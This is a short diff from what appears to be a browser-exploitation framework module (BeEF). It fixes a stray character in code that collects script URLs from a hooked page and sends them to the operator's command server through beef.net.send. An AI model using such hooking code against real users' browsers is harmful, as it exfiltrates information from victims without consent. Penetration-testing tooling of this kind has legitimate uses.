@@ -69,7 +69,7 @@ beef.execute(function() {
                 }
             }
             if(results.length >0){
-                urls=unique(results).join('||');a
+                urls=unique(results).join('||');
                 beef.net.send("<%= @command_url %>", <%=  @command_id %>, "script_urls="+urls);
             }
             else{
